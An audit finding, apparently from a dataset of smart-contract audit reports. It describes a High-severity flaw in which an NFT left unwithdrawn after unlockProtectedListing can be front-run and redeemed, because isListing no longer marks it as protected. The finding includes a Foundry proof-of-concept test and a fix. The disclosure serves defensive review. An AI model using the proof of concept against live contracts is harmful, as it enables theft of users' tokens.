# [H] Owner Can Lose The Token Af-

## Summary
Severity: High
Contest weight: 0.7869
Dataset id: 23220
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The unlockProtectedListing function allows a user to unlock an NFT and make it
withdrawable for themselves. However, if the user does not immediately withdraw the
NFT, another user can front-run the process by swapping, redeeming, or buying the NFT,
as there is no protection mechanism preventing this. The Locker::isListing function
fails to correctly identify the unlocked NFT as being in a protected state, allowing it to
be redeemed.
When the unlockProtectedListing function is called, the NFT owner can either withdraw
the NFT or leave it in the contract for later withdrawal. However if the NFT is not
withdrawn immediately, a malicious user can swap, redeem, or buy the unlocked NFT.
Inside the unlockProtectedListing function, if the owner opts not to withdraw the NFT,
the listing owner is set to zero and the NFT becomes withdrawable later by the rightful
owner.
```solidity
// Delete the listing objects
delete _protectedListings[_collection][_tokenId];
// Transfer the listing ERC721 back to the user
if (_withdraw) {
    locker.withdrawToken(_collection, _tokenId, msg.sender);
    emit ListingAssetWithdraw(_collection, _tokenId);
} else {
    canWithdrawAsset[_collection][_tokenId] = msg.sender;
}
```
However, due to this owner field being set to zero, the Locker::isListing function
incorrectly interprets the NFT as no longer being protected, allowing other users to
redeem or buy the unlocked NFT before the rightful owner can withdraw it.
```solidity
function isListing(address _collection, uint _tokenId) public view returns (bool) {
    IListings _listings = listings;
    // Check if we have a liquid or dutch listing
    if (_listings.listings(_collection, _tokenId).owner != address(0)) {
        return true;
    }
    // Check if we have a protected listing
    if (_listings.protectedListings().listings(_collection, _tokenId).owner != address(0)) {
        return true;
    }
    return false;
}
```
Test:
```solidity
function test_redeemBeforeOner(uint _tokenId, uint96 _tokensTaken) public {
    _assumeValidTokenId(_tokenId);
    vm.assume(_tokensTaken >= 0.1 ether);
    vm.assume(_tokensTaken <= 1 ether - protectedListings.KEEPER_REWARD());
    // Set the owner to one of our test users (Alice)
    address payable _owner = users[0];
    // Mint our token to the _owner and approve the {Listings} contract to use it
    erc721a.mint(_owner, _tokenId);
    // Create our listing
    vm.startPrank(_owner);
    erc721a.approve(address(protectedListings), _tokenId);
    _createProtectedListing({
        _listing: IProtectedListings.CreateListing({
            collection: address(erc721a),
            tokenIds: _tokenIdToArray(_tokenId),
            listing: IProtectedListings.ProtectedListing({
                owner: _owner,
                tokenTaken: _tokensTaken,
                checkpoint: 0
            })
        })
    });
    // Approve the ERC20 token to be used by the listings contract to unlock the listings
    locker.collectionToken(address(erc721a)).approve(
        address(protectedListings),
        _tokensTaken
    );
    protectedListings.unlockProtectedListing(
        address(erc721a),
        _tokenId,
        false
    );
    vm.stopPrank();
    // Approve the ERC20 token to be used by the listings contract to unlock the listings
    locker.collectionToken(address(erc721a)).approve(
        address(locker),
        1000000000000 ether
    );
    uint[] memory redeemTokenIds = new uint[](1);
    redeemTokenIds[0] = _tokenId;
    locker.redeem(address(erc721a), redeemTokenIds);
    vm.prank(_owner);
    // Owner cant withdraw anymore since they have been redeemed
    protectedListings.withdrawProtectedListing(address(erc721a), _tokenId);
}
```
original owner might lose the NFT to a malicious actor who front-runs the withdrawal process

## Recommendation
Modify isListing function: Ensure that tokens marked as canWithdrawAsset are still considered active listings until they are fully withdrawn by their rightful owner.
